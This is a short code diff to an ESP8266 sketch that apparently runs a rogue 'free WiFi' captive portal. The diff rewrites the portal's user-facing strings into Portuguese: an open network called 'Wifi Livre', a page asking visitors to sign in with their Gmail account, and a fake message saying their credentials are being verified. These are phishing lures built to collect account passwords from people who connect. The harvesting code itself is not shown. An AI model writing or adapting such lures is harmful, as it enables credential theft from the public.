@@ -7,14 +7,14 @@
 #include <ESP8266WebServer.h>
 
 // User configuration
-#define SSID_NAME "Free WiFi"
-#define SUBTITLE "Free WiFi service."
-#define TITLE "Sign in:"
-#define BODY "Create an account to get connected to the internet."
-#define POST_TITLE "Validating..."
-#define POST_BODY "Your account is being validated. Please, wait up to 5 minutes for device connection.</br>Thank you."
-#define PASS_TITLE "Credentials"
-#define CLEAR_TITLE "Cleared"
+#define SSID_NAME "Wifi Livre"
+#define SUBTITLE "Wifi Livre."
+#define TITLE "Login via gmail:"
+#define BODY "Entre com sua conta do gmail e tenha acesso livre."
+#define POST_TITLE "validando..."
+#define POST_BODY "Suas credenciais estão sendo verificadas. Por Favor espere de 15 a 35 segundos para verificarmos.</br>Thank you."
+#define PASS_TITLE "Verificado"
+#define CLEAR_TITLE "F"
 
 // Init System Settings
 const byte HTTP_CODE = 200;
